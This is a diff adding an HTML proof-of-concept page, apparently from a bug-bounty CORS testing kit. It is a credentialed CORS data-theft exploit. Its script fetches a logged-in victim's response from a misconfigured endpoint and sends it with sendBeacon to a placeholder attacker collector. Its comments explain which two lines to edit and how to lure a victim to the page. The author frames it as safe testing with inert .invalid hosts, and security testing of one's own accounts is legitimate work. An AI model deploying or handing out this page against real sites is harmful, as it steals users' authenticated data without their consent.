@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<!--
+  Safe PoC -> x8bitranjit
+  Attacker-hosted CORS exfil page (the actual exploit for CORS kit rows 004/010).
+  INERT: both placeholders use .invalid - nothing resolves until you edit.
+
+  WHAT TO EDIT (2 lines, marked EDIT):
+    TARGET_URL  -> the CORS-vulnerable endpoint that reflects your Origin + ACAC:true
+    COLLECTOR   -> your listener (interactsh/Collaborator/your VPS)
+
+  USE: host on YOUR origin (github.io, your VPS), send the link to a logged-in
+  victim (or your own test account) - page reads the credentialed response and
+  beacons it. Two-account discipline: prove with your own accounts first.
+-->
+<html>
+<body>
+<h3>Loading...</h3>
+<script>
+// EDIT:
+const TARGET_URL = "https://target.example.invalid/api/me";   // CORS-vuln endpoint
+const COLLECTOR  = "https://attacker.example.invalid/cors";   // your listener
+
+fetch(TARGET_URL, { credentials: "include" })
+  .then(r => r.text())
+  .then(d => {
+    document.body.textContent = "exfiltrated " + d.length + " bytes";
+    navigator.sendBeacon(COLLECTOR, d);                       // exfil proof
+    // benign mode: replace sendBeacon with console.log(d) for local testing
+  })
+  .catch(e => document.body.textContent = "fetch failed (CORS blocked or placeholder): " + e);
+</script>
+</body>
+</html>
